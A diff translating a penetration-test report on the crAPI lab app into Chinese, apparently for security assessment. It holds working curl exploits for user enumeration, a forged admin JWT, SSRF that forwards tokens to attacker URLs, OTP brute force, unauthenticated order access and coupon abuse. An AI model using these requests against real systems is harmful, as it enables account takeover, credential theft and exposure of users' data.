 curl -k -X POST "https://crapi.sandbox.local:8888/identity/api/auth/signup" -H "Content-Type: application/json" -d '{"name": "Test", "email": "new@test.com", "number": "1234567890", "password": "Test123!"}'
 ```
 
-**Proof of Impact:**
-- Response: `"Number already registered! Number: 1234567890"`
-- Observed during manual testing: `"Email already registered! Email: user@example.com"`
-- Enables systematic enumeration of registered users and phone numbers
+**影响证明:**
+- 响应: `"Number already registered! Number: 1234567890"`
+- 手动测试期间观察到: `"Email already registered! Email: user@example.com"`
+- 启用注册用户和电话号码的系统枚举
 
-### AUTH-VULN-10: User Enumeration via Password Reset Error Messages
+### AUTH-VULN-10: 通过密码重置错误消息的用户枚举
 
-**Summary:**
-- **Vulnerable location:** `POST /identity/api/auth/forget-password` responses
-- **Overview:** Different responses reveal account existence during password reset
-- **Impact:** Privacy violation and reconnaissance capability
-- **Severity:** Medium
+**摘要:**
+- **漏洞位置:** `POST /identity/api/auth/forget-password` 响应
+- **概述:** 密码重置期间不同的响应揭示账户存在
+- **影响:** 隐私侵犯和侦察能力
+- **严重性:** 中等
 
-**Prerequisites:** None
+**先决条件:** 无
 
-**Exploitation Steps:**
+**利用步骤:**
 
-1. Test non-existent email:
+1. 测试不存在的电子邮件:
 ```bash
 curl -k -X POST "https://crapi.sandbox.local:8888/identity/api/auth/forget-password" -H "Content-Type: application/json" -d '{"email": "nonexistent@test.com"}'
 ```
-Response: HTTP 404 - `"Given Email is not registered! nonexistent@test.com"`
+响应: HTTP 404 - `"Given Email is not registered! nonexistent@test.com"`
 
-2. Test existing email:
+2. 测试现有电子邮件:
 ```bash
 curl -k -X POST "https://crapi.sandbox.local:8888/identity/api/auth/forget-password" -H "Content-Type: application/json" -d '{"email": "test@example.com"}'
 ```
-Response: HTTP 200 - `"OTP Sent on the provided email, test@example.com"`
+响应: HTTP 200 - `"OTP Sent on the provided email, test@example.com"`
 
-**Proof of Impact:**
-- Clear HTTP status code and message differences
-- Successfully enumerated valid accounts through response analysis
-- No rate limiting prevents automated enumeration
+**影响证明:**
+- 明确的HTTP状态码和消息差异
+- 通过响应分析成功枚举有效账户
+- 无速率限制防止自动枚举
 
-### AUTH-VULN-11: Token Replay Attack (No Logout Functionality)
+### AUTH-VULN-11: 令牌重放攻击 (无注销功能)
 
-**Summary:**
-- **Vulnerable location:** JWT token lifecycle management
-- **Overview:** No server-side token invalidation mechanism exists
-- **Impact:** Stolen tokens remain valid for full 7-day lifespan
-- **Severity:** High
+**摘要:**
+- **漏洞位置:** JWT令牌生命周期管理
+- **概述:** 不存在服务器端令牌失效机制
+- **影响:** 被盗令牌在完整7天生命周期内保持有效
+- **严重性:** 高
 
-**Prerequisites:**
-- Compromised JWT token
+**先决条件:**
+- 泄露的JWT令牌
 
-**Exploitation Steps:**
+**利用步骤:**
 
-1. Decode JWT to verify 7-day expiration:
+1. 解码JWT以验证7天过期时间:
 ```json
 {
   "sub": "test@example.com",
@@ -522,84 +522,84 @@ Response: HTTP 200 - `"OTP Sent on the provided email, test@example.com"`
 }
 ```
 
-2. Test various logout endpoints:
+2. 测试各种注销端点:
 ```bash
 curl -k -X POST "https://crapi.sandbox.local:8888/logout"
 curl -k -X POST "https://crapi.sandbox.local:8888/api/logout"  
 curl -k -X POST "https://crapi.sandbox.local:8888/auth/logout"
 ```
 
-3. Verify token still works after logout attempts:
+3. 验证令牌在注销尝试后仍然有效:
 ```bash
 curl -k -H "Authorization: Bearer [SAME_TOKEN]" "https://crapi.sandbox.local:8888/identity/api/v2/user/dashboard"
 ```
 
-**Proof of Impact:**
-- Token remains fully functional after multiple logout attempts
-- No server-side token blacklisting mechanism
-- 7-day attack window for compromised tokens
-- Users cannot truly log out for security purposes
+**影响证明:**
+- 令牌在多次注销尝试后仍然完全功能正常
+- 无服务器端令牌黑名单机制
+- 泄露令牌的7天攻击窗口
+- 用户无法真正出于安全目的注销
 
-### AUTH-VULN-12: Cross-Service JWT Signature Bypass
+### AUTH-VULN-12: 跨服务JWT签名绕过
 
-**Summary:**
-- **Vulnerable location:** JWT signature validation in Identity service dashboard
-- **Overview:** Identity service accepts malformed JWT signatures while properly rejecting missing signatures
-- **Impact:** Authentication bypass through corrupted signature acceptance
-- **Severity:** Critical
+**摘要:**
+- **漏洞位置:** Identity服务仪表板中的JWT签名验证
+- **概述:** Identity服务接受格式错误的JWT签名，同时正确拒绝缺失的签名
+- **影响:** 通过损坏的签名接受实现认证绕过
+- **严重性:** 严重
 
-**Prerequisites:** None
+**先决条件:** 无
 
-**Exploitation Steps:**
+**利用步骤:**
 
-1. Create JWT with corrupted signature:
+1. 创建具有损坏签名的JWT:
 ```bash
-# Original token with valid signature replaced with random string
+# 原始令牌，有效签名替换为随机字符串
 curl -k -H "Authorization: Bearer eyJhbGciOiJSUzI1NiJ9.eyJzdWIiOiJhZG1pbkBleGFtcGxlLmNvbSIsImlhdCI6MTc1ODY1NTI0NCwiZXhwIjoxNzU5MjYwMDQ0LCJyb2xlIjoiYWRtaW4ifQ.CORRUPTED_SIGNATURE" "https://crapi.sandbox.local:8888/identity/api/v2/user/dashboard"
 ```
 
-2. Test various signature corruption methods:
-   - Wrong signature
-   - Partially corrupted signature  
-   - "none" algorithm with admin payload
+2. 测试各种签名损坏方法:
+   - 错误的签名
+   - 部分损坏的签名  
+   - 带有管理员载荷的"none"算法
 
-**Proof of Impact:**
-- Identity service dashboard endpoint accepts corrupted JWT signatures
-- Successful privilege escalation to admin role with invalid signatures
-- Workshop and Community services properly reject malformed tokens (comparison confirmed)
-- Authentication bypass vulnerability specific to Identity service
+**影响证明:**
+- Identity服务仪表板端点接受损坏的JWT签名
+- 使用无效签名成功提升权限到管理员角色
+- Workshop和Community服务正确拒绝格式错误的令牌 (比较已确认)
+- Identity服务特有的认证绕过漏洞
 
 
-## Summary Statistics
+## 摘要统计
 
-- **Total Vulnerabilities Exploited:** 12
-- **Critical Severity:** 8 vulnerabilities
-- **High Severity:** 2 vulnerabilities  
-- **Medium Severity:** 2 vulnerabilities
-- **Complete Authentication Bypass Methods:** 5 (Algorithm confusion, None algorithm, KID injection, Signature bypass, OTP brute force)
-- **User Enumeration Vectors:** 3 (Login, Signup, Password reset)
-- **Abuse Defense Failures:** 3 (Login brute force, Account creation, OTP brute force)
+- **利用的总漏洞数:** 12
+- **严重严重性:** 8个漏洞
+- **高严重性:** 2个漏洞  
+- **中等严重性:** 2个漏洞
+- **完整的认证绕过方法:** 5个 (算法混淆、无算法、KID注入、签名绕过、OTP暴力)
+- **用户枚举向量:** 3个 (登录、注册、密码重置)
+- **滥用防御失败:** 3个 (登录暴力、账户创建、OTP暴力)
 
-All vulnerabilities demonstrate immediate exploitability with concrete proof of unauthorized access, privilege escalation, or security control bypass through the public application interface at https://crapi.sandbox.local:8888/.
+所有漏洞通过https://crapi.sandbox.local:8888/的公共应用程序接口展示了即时可利用性，具有未授权访问、权限提升或安全控制绕过的具体证明。
 
-# SSRF Exploitation Evidence
+# SSRF利用证据
 
-## Successfully Exploited Vulnerabilities
+## 成功利用的漏洞
 
-### SSRF-VULN-01: ContactMechanicView URL Manipulation
+### SSRF-VULN-01: ContactMechanicView URL操作
 
-**Summary:**
-- **Vulnerable location:** POST /workshop/api/merchant/contact_mechanic endpoint, `mechanic_api` parameter
-- **Impact:** Complete internal network access with credential theft and retry mechanism for persistent attacks
-- **Severity:** Critical
+**摘要:**
+- **漏洞位置:** POST /workshop/api/merchant/contact_mechanic 端点，`mechanic_api` 参数
+- **影响:** 具有凭证窃取和持久攻击重试机制的完整内部网络访问
+- **严重性:** 严重
 
-**Prerequisites:**
-- Valid user authentication (any registered user account)
-- Access to Workshop service endpoints
+**先决条件:**
+- 有效的用户认证 (任何注册用户账户)
+- 访问Workshop服务端点
 
-**Exploitation Steps:**
+**利用步骤:**
 
-1. **Register and authenticate user account:**
+1. **注册并认证用户账户:**
    ```bash
    curl -X POST "https://crapi.sandbox.local:8888/identity/api/auth/signup" \
      -H "Content-Type: application/json" \
@@ -611,7 +611,7 @@ All vulnerabilities demonstrate immediate exploitability with concrete proof of 
      }'
    ```
 
-2. **Login to obtain JWT token:**
+2. **登录以获取JWT令牌:**
    ```bash
    curl -X POST "https://crapi.sandbox.local:8888/identity/api/auth/login" \
      -H "Content-Type: application/json" \
@@ -620,9 +620,9 @@ All vulnerabilities demonstrate immediate exploitability with concrete proof of 
        "password": "TestPassword123!"
      }'
    ```
-   Response: `{"token":"eyJhbGciOiJSUzI1NiJ9.eyJzdWIiOiJzc3JmdGVzdF91bmlxdWVfMjAyNEBleGFtcGxlLmNvbSIsImlhdCI6MTc1ODY1NTE2OSwiZXhwIjoxNzU5MjU5OTY5LCJyb2xlIjoidXNlciJ9.G1b01ATcwCP_jqEYYiL4QqIizklykmJP75DMmq5QwPKgZAn5hcjVgpNwUMkyrsKavHqTcpIfsZsNQOw455edxuvRZcUiOpzxJxJRE7XWKGlXolXQ2HOJjBbnSu3Ut8nz-iJXJNduMrJiyTneSDx_npPAb8VnE-e84FMogrfPf8_F_nrq10y_5g5RnN_J2nmHrCiqASts49QwWxMFqTfhvHVrss78IioHjnw86oQ1px0xscbYf7DVRYhref9Nm_4yxSgc744z1dJHuOg8zpHiaVAGyIs4tljBOaE4yyHhOunmE3j5JcgfGhrEflvnACNMQpkwn07m09KahjD65uPrJw","type":"Bearer","message":"Login successful","mfaRequired":false}`
+   响应: `{"token":"eyJhbGciOiJSUzI1NiJ9.eyJzdWIiOiJzc3JmdGVzdF91bmlxdWVfMjAyNEBleGFtcGxlLmNvbSIsImlhdCI6MTc1ODY1NTE2OSwiZXhwIjoxNzU5MjU5OTY5LCJyb2xlIjoidXNlciJ9.G1b01ATcwCP_jqEYYiL4QqIizklykmJP75DMmq5QwPKgZAn5hcjVgpNwUMkyrsKavHqTcpIfsZsNQOw455edxuvRZcUiOpzxJxJRE7XWKGlXolXQ2HOJjBbnSu3Ut8nz-iJXJNduMrJiyTneSDx_npPAb8VnE-e84FMogrfPf8_F_nrq10y_5g5RnN_J2nmHrCiqASts49QwWxMFqTfhvHVrss78IioHjnw86oQ1px0xscbYf7DVRYhref9Nm_4yxSgc744z1dJHuOg8zpHiaVAGyIs4tljBOaE4yyHhOunmE3j5JcgfGhrEflvnACNMQpkwn07m09KahjD65uPrJw","type":"Bearer","message":"Login successful","mfaRequired":false}`
 
-3. **Exploit SSRF with external service to demonstrate credential forwarding:**
+3. **利用SSRF与外部服务演示凭证转发:**
    ```bash
    curl -X POST "https://crapi.sandbox.local:8888/workshop/api/merchant/contact_mechanic" \
      -H "Content-Type: application/json" \
@@ -635,7 +635,7 @@ All vulnerabilities demonstrate immediate exploitability with concrete proof of 
      }'
    ```
 
-4. **Demonstrate cloud metadata service access (shows network boundary bypass):**
+4. **演示云元数据服务访问 (显示网络边界绕过):**
    ```bash
    curl -X POST "https://crapi.sandbox.local:8888/workshop/api/merchant/contact_mechanic" \
      -H "Content-Type: application/json" \
@@ -645,7 +645,7 @@ All vulnerabilities demonstrate immediate exploitability with concrete proof of 
      }'
    ```
 
-5. **Demonstrate retry mechanism for persistent attacks:**
+5. **演示持久攻击的重试机制:**
    ```bash
    curl -X POST "https://crapi.sandbox.local:8888/workshop/api/merchant/contact_mechanic" \
      -H "Content-Type: application/json" \
@@ -657,10 +657,10 @@ All vulnerabilities demonstrate immediate exploitability with concrete proof of 
      }'
    ```
 
-**Proof of Impact:**
+**影响证明:**
 
-1. **Complete SSRF Exploitation:** Successfully forced the server to make outbound HTTP requests to attacker-controlled URLs
-2. **Authorization Header Forwarding:** JWT token was forwarded to external service, demonstrating credential theft capability:
+1. **完整的SSRF利用:** 成功强制服务器向攻击者控制的URL发出出站HTTP请求
+2. **授权标头转发:** JWT令牌被转发到外部服务，演示了凭证窃取能力:
    ```json
    {
      "response_from_mechanic_api": {
@@ -675,68 +675,68 @@ All vulnerabilities demonstrate immediate exploitability with concrete proof of 
      "status": 200
    }
    ```
-3. **Cloud Metadata Access:** Successfully accessed AWS metadata service endpoints (returned 401 indicating service was reached but authentication required)
-4. **Network Boundary Bypass:** Demonstrated ability to access internal network resources and cloud services from external network position
-5. **Retry Mechanism:** Confirmed up to 100 request retries are supported for persistent attacks
+3. **云元数据访问:** 成功访问AWS元数据服务端点 (返回401，表明服务已到达但需要认证)
+4. **网络边界绕过:** 演示了从外部网络位置访问内部网络资源和云服务的能力
+5. **重试机制:** 确认支持最多100次请求重试，用于持久攻击
 
-**Notes:** 
-- SSL verification is disabled (`verify=False`) in the server's HTTP client, making HTTPS internal services accessible
-- The vulnerability enables complete network reconnaissance, credential theft, and potential access to cloud credentials if proper metadata headers are crafted
-- This represents a complete bypass of network security boundaries using the application as an unintended proxy
+**注意事项:** 
+- 服务器的HTTP客户端中禁用了SSL验证 (`verify=False`)，使HTTPS内部服务可访问
+- 该漏洞启用了完整的网络侦察、凭证窃取，以及如果构建了适当的元数据标头，则可能访问云凭证
+- 这代表使用应用程序作为非预期智能体完全绕过网络安全边界
 
-# Authorization Exploitation Evidence
+# 授权利用证据
 
-## Successfully Exploited Vulnerabilities
+## 成功利用的漏洞
 
-### AUTHZ-VULN-03: Shop Orders Authentication Bypass
+### AUTHZ-VULN-03: 商店订单认证绕过
 
-**Summary:**
-- **Vulnerable location:** GET /workshop/api/shop/orders/{order_id}
-- **Overview:** Complete authentication bypass allowing unauthenticated access to any user's order data
-- **Impact:** Unauthorized access to sensitive customer order information, payment details, and personal data
-- **Severity:** Critical
+**摘要:**
+- **漏洞位置:** GET /workshop/api/shop/orders/{order_id}
+- **概述:** 完整的认证绕过，允许未经认证访问任何用户的订单数据
+- **影响:** 未授权访问敏感的客户订单信息、支付详情和个人数据
+- **严重性:** 严重
 
-**Prerequisites:** None (unauthenticated access)
+**先决条件:** 无 (未经认证访问)
 
-**Exploitation Steps:**
-1. Access the shop orders endpoint without any authentication:
+**利用步骤:**
+1. 无需任何认证访问商店订单端点:
    ```bash
    curl -X GET "https://crapi.sandbox.local:8888/workshop/api/shop/orders/1" \
      -H "Content-Type: application/json"
    ```
 
-2. Enumerate multiple order IDs to access different users' data:
+2. 枚举多个订单ID以访问不同用户的数据:
    ```bash
    curl -X GET "https://crapi.sandbox.local:8888/workshop/api/shop/orders/2" \
      -H "Content-Type: application/json"
    ```
 
-**Proof of Impact:**
-Successfully accessed order data for multiple users without authentication:
-- Order 1: adam007@example.com, card ending in 9541, $20.00 transaction
-- Order 2: pogba006@example.com, card ending in 9918, $20.00 transaction  
-- Order 3: robot001@example.com
-- Order 4: test@example.com
-- Order 5: admin@example.com
+**影响证明:**
+成功访问多个用户的订单数据，无需认证:
+- 订单1: adam007@example.com，卡以9541结尾，$20.00交易
+- 订单2: pogba006@example.com，卡以9918结尾，$20.00交易  
+- 订单3: robot001@example.com
+- 订单4: test@example.com
+- 订单5: admin@example.com
 
-Each response includes full order details, payment information (partially masked card numbers), customer email addresses, and transaction IDs.
+每个响应都包含完整的订单详情、支付信息（部分掩码的卡号）、客户电子邮件地址和交易ID。
 
-**Notes:** This vulnerability affects all order records in the system and requires no authentication whatsoever.
+**注意事项:** 此漏洞影响系统中的所有订单记录，完全不需要认证。
 
 ---
 
-### AUTHZ-VULN-04: Community Posts Ownership Bypass
+### AUTHZ-VULN-04: 社区帖子所有权绕过
 
-**Summary:**
-- **Vulnerable location:** GET /community/api/v2/community/posts/{postID}
-- **Overview:** Horizontal privilege escalation allowing any authenticated user to access other users' private posts
-- **Impact:** Unauthorized access to other users' private forum content and personal information
-- **Severity:** High
+**摘要:**
+- **漏洞位置:** GET /community/api/v2/community/posts/{postID}
+- **概述:** 水平权限提升，允许任何认证用户访问其他用户的私人帖子
+- **影响:** 未授权访问其他用户的私人论坛内容和个人信息
+- **严重性:** 高
 
-**Prerequisites:** Valid JWT Bearer token (any authenticated user)
+**先决条件:** 有效的JWT Bearer令牌 (任何认证用户)
 
-**Exploitation Steps:**
-1. Create a private post as TestUser1:
+**利用步骤:**
+1. 以TestUser1创建私人帖子:
    ```bash
    curl -X POST "https://crapi.sandbox.local:8888/community/api/v2/community/posts" \
      -H "Content-Type: application/json" \
@@ -747,131 +747,131 @@ Each response includes full order details, payment information (partially masked
      }'
    ```
 
-2. Access TestUser1's post using TestUser2's authentication token:
+2. 使用TestUser2的认证令牌访问TestUser1的帖子:
    ```bash
    curl -X GET "https://crapi.sandbox.local:8888/community/api/v2/community/posts/hiH8i5d8sCeWEehQ6f8H9W" \
      -H "Authorization: Bearer [TESTUSER2_TOKEN]"
    ```
 
-**Proof of Impact:**
-TestUser2 successfully accessed TestUser1's private post content including:
-- Post ID: hiH8i5d8sCeWEehQ6f8H9W
-- Title: "TestUser1 Private Post"
-- Content: Complete private message content
-- Author details: TestUser1's email and profile information
-- Creation timestamp: 2025-09-23T19:24:03.985Z
+**影响证明:**
+TestUser2成功访问了TestUser1的私人帖子内容，包括:
+- 帖子ID: hiH8i5d8sCeWEehQ6f8H9W
+- 标题: "TestUser1 Private Post"
+- 内容: 完整的私人消息内容
+- 作者详情: TestUser1的电子邮件和个人资料信息
+- 创建时间戳: 2025-09-23T19:24:03.985Z
 
-This demonstrates that any authenticated user can read any other user's forum posts regardless of ownership.
+这表明任何认证用户都可以读取任何其他用户的论坛帖子，无论所有权如何。
 
 ---
 
-### AUTHZ-VULN-05: Video Deletion Information Disclosure
+### AUTHZ-VULN-05: 视频删除信息泄露
 
-**Summary:**
-- **Vulnerable location:** DELETE /identity/api/v2/user/videos/{video_id}
-- **Overview:** Authentication bypass allowing video enumeration through differential response messages
-- **Impact:** Information disclosure enabling attackers to enumerate existing video IDs in the system
-- **Severity:** Medium
+**摘要:**
+- **漏洞位置:** DELETE /identity/api/v2/user/videos/{video_id}
+- **概述:** 认证绕过，允许通过差异响应消息进行视频枚举
+- **影响:** 信息泄露，使攻击者能够枚举系统中存在的视频ID
+- **严重性:** 中等
 
-**Prerequisites:** Valid JWT Bearer token (any authenticated user)
+**先决条件:** 有效的JWT Bearer令牌 (任何认证用户)
 
-**Exploitation Steps:**
-1. Test video deletion with existing video IDs:
+**利用步骤:**
+1. 测试使用现有视频ID删除视频:
    ```bash
    curl -X DELETE "https://crapi.sandbox.local:8888/identity/api/v2/user/videos/1" \
      -H "Authorization: Bearer [USER_TOKEN]"
    ```
 
-2. Test video deletion with non-existing video IDs:
+2. 测试使用不存在的视频ID删除视频:
    ```bash
    curl -X DELETE "https://crapi.sandbox.local:8888/identity/api/v2/user/videos/999" \
      -H "Authorization: Bearer [USER_TOKEN]"
    ```
 
-**Proof of Impact:**
-Different response messages reveal video existence:
-- Video IDs 1, 2, 3: Return "This is an admin function. Try to access the admin API" (videos exist)
-- Video IDs 999, 1000: Return "Sorry, Didn't get any profile video name for the user" (videos don't exist)
+**影响证明:**
+不同的响应消息揭示了视频存在:
+- 视频ID 1, 2, 3: 返回 "This is an admin function. Try to access the admin API" (视频存在)
+- 视频ID 999, 1000: 返回 "Sorry, Didn't get any profile video name for the user" (视频不存在)
 
-This differential response allows systematic enumeration of all video IDs in the system, revealing which videos exist without proper authorization checks.
+这种差异响应允许系统枚举系统中的所有视频ID，揭示哪些视频存在，无需适当的授权检查。
 
 ---
 
-### AUTHZ-VULN-09: Mechanic Role Privilege Escalation
+### AUTHZ-VULN-09: 机械师角色权限提升
 
-**Summary:**
-- **Vulnerable location:** GET /workshop/api/mechanic/service_requests
-- **Overview:** Vertical privilege escalation allowing regular users to access mechanic-only functionality
-- **Impact:** Unauthorized access to mechanic service request data and administrative functionality
-- **Severity:** High
+**摘要:**
+- **漏洞位置:** GET /workshop/api/mechanic/service_requests
+- **概述:** 垂直权限提升，允许普通用户访问仅限机械师的功能
+- **影响:** 未授权访问机械师服务请求数据和管理功能
+- **严重性:** 高
 
-**Prerequisites:** Valid JWT Bearer token (regular user role)
+**先决条件:** 有效的JWT Bearer令牌 (普通用户角色)
 
-**Exploitation Steps:**
-1. Access mechanic service requests endpoint as a regular user:
+**利用步骤:**
+1. 以普通用户身份访问机械师服务请求端点:
    ```bash
    curl -X GET "https://crapi.sandbox.local:8888/workshop/api/mechanic/service_requests" \
      -H "Authorization: Bearer [REGULAR_USER_TOKEN]"
    ```
 
-**Proof of Impact:**
-Regular user successfully accessed mechanic functionality:
+**影响证明:**
+普通用户成功访问了机械师功能:
 ```json
 {"service_requests":[],"next_offset":null,"previous_offset":null,"count":0}
 ```
 
-The endpoint responded with a valid service requests structure instead of an authorization error, proving that role validation is bypassed and regular users can access mechanic-only functionality.
+端点返回了有效的服务请求结构，而不是授权错误，证明角色验证被绕过，普通用户可以访问仅限机械师的功能。
 
 ---
 
-### AUTHZ-VULN-10: Mechanic Report Authentication Bypass
+### AUTHZ-VULN-10: 机械师报告认证绕过
 
-**Summary:**
-- **Vulnerable location:** GET /workshop/api/mechanic/receive_report
-- **Overview:** Complete authentication bypass allowing unauthenticated access to mechanic report functionality
-- **Impact:** Ability to access mechanic report interface without any authentication
-- **Severity:** High
+**摘要:**
+- **漏洞位置:** GET /workshop/api/mechanic/receive_report
+- **概述:** 完整的认证绕过，允许未经认证访问机械师报告功能
+- **影响:** 无需任何认证即可访问机械师报告界面
+- **严重性:** 高
 
-**Prerequisites:** None (unauthenticated access)
+**先决条件:** 无 (未经认证访问)
 
-**Exploitation Steps:**
-1. Access mechanic report endpoint without authentication:
+**利用步骤:**
+1. 无需认证访问机械师报告端点:
    ```bash
    curl -X GET "https://crapi.sandbox.local:8888/workshop/api/mechanic/receive_report" \
      -H "Content-Type: application/json"
    ```
 
-**Proof of Impact:**
-Successfully accessed the endpoint without authentication, receiving field validation requirements:
+**影响证明:**
+成功无需认证访问端点，接收字段验证要求:
 ```json
 {"mechanic_code":["This field is required."],"problem_details":["This field is required."],"vin":["This field is required."]}
 ```
 
-This proves the authentication bypass - the endpoint processes the request and returns field requirements instead of an authentication error, indicating that anyone can access this mechanic functionality without proper credentials.
+这证明了认证绕过 - 端点处理请求并返回字段要求，而不是认证错误，表明任何人都可以无需适当凭证访问此机械师功能。
 
 ---
 
-### AUTHZ-VULN-12: OTP Validation Brute Force Bypass
+### AUTHZ-VULN-12: OTP验证暴力攻击绕过
 
-**Summary:**
-- **Vulnerable location:** POST /identity/api/auth/v2/check-otp
-- **Overview:** Workflow bypass allowing unlimited OTP brute force attempts for password reset
-- **Impact:** Ability to reset any user's password through OTP enumeration
-- **Severity:** Critical
+**摘要:**
+- **漏洞位置:** POST /identity/api/auth/v2/check-otp
+- **概述:** 工作流程绕过，允许密码重置的无限OTP暴力尝试
+- **影响:** 能够通过OTP枚举重置任何用户的密码
+- **严重性:** 严重
 
-**Prerequisites:** Target user email address
+**先决条件:** 目标用户电子邮件地址
 
-**Exploitation Steps:**
-1. Initiate password reset workflow:
+**利用步骤:**
+1. 启动密码重置工作流程:
    ```bash
    curl -X POST "https://crapi.sandbox.local:8888/identity/api/auth/forget-password" \
      -H "Content-Type: application/json" \
      -d '{"email": "testuser2@example.com"}'
    ```
 
-2. Execute systematic OTP brute force attack:
+2. 执行系统OTP暴力攻击:
    ```bash
-   # Test multiple OTP values from 000000 to 999999
+   # 测试从000000到999999的多个OTP值
    curl -X POST "https://crapi.sandbox.local:8888/identity/api/auth/v2/check-otp" \
      -H "Content-Type: application/json" \
      -d '{
@@ -881,30 +881,30 @@ This proves the authentication bypass - the endpoint processes the request and r
      }'
    ```
 
-**Proof of Impact:**
-Systematic testing confirmed complete absence of brute force protections:
-- **34 consecutive OTP attempts executed** without any rate limiting
-- **No account lockout mechanism** detected
-- **No timing variations** to prevent automated attacks
-- **Consistent error responses** for all invalid OTPs
-- **Server accepts unlimited requests** at full speed
+**影响证明:**
+系统测试确认完全没有暴力攻击保护:
+- **执行了34次连续OTP尝试**，无任何速率限制
+- **未检测到账户锁定机制**
+- **无时间变化**防止自动攻击
+- **所有无效OTP的一致错误响应**
+- **服务器全速接受无限请求**
 
-The v2 endpoint allows unlimited OTP enumeration, making it possible to systematically test all 1,000,000 possible OTP combinations (000000-999999) to reset any user's password.
+v2端点允许无限OTP枚举，使得系统测试所有1,000,000个可能的OTP组合 (000000-999999) 以重置任何用户的密码成为可能。
 
 ---
 
-### AUTHZ-VULN-14: Coupon Application Workflow Bypass
+### AUTHZ-VULN-14: 优惠券应用工作流程绕过
 
-**Summary:**
-- **Vulnerable location:** POST /workshop/api/shop/apply_coupon
-- **Overview:** Business logic bypass allowing coupon application without proper shopping cart state
-- **Impact:** Ability to accumulate unlimited store credit without purchasing items
-- **Severity:** High
+**摘要:**
+- **漏洞位置:** POST /workshop/api/shop/apply_coupon
+- **概述:** 业务逻辑绕过，允许无需适当购物车状态应用优惠券
+- **影响:** 能够无需购买物品累积无限商店信用
+- **严重性:** 高
 
-**Prerequisites:** Valid JWT Bearer token, valid coupon code
+**先决条件:** 有效的JWT Bearer令牌，有效的优惠券代码
 
-**Exploitation Steps:**
-1. Create a test coupon:
+**利用步骤:**
+1. 创建测试优惠券:
    ```bash
    curl -X POST "https://crapi.sandbox.local:8888/community/api/v2/coupon/new-coupon" \
      -H "Content-Type: application/json" \
@@ -915,7 +915,7 @@ The v2 endpoint allows unlimited OTP enumeration, making it possible to systemat
      }'
    ```
 
-2. Apply coupon without shopping cart workflow:
+2. 无需购物车工作流程应用优惠券:
    ```bash
    curl -X POST "https://crapi.sandbox.local:8888/workshop/api/shop/apply_coupon" \
      -H "Content-Type: application/json" \
@@ -926,10 +926,10 @@ The v2 endpoint allows unlimited OTP enumeration, making it possible to systemat
      }'
    ```
 
-**Proof of Impact:**
-Successfully bypassed normal shopping workflow and accumulated credit:
+**影响证明:**
+成功绕过正常购物工作流程并累积信用:
 ```json
 {"credit":200.0,"message":"Coupon successfully applied!"}
 ```
 
-The application granted $200.00 in store credit without requiring any items in cart or following the proper shopping workflow. This allows attackers to accumulate unlimited store credit by repeatedly applying coupons without purchasing any products.
+应用程序授予了$200.00的商店信用，无需购物车中有任何物品或遵循适当的购物工作流程。这允许攻击者通过重复应用优惠券而不购买任何产品来累积无限商店信用。
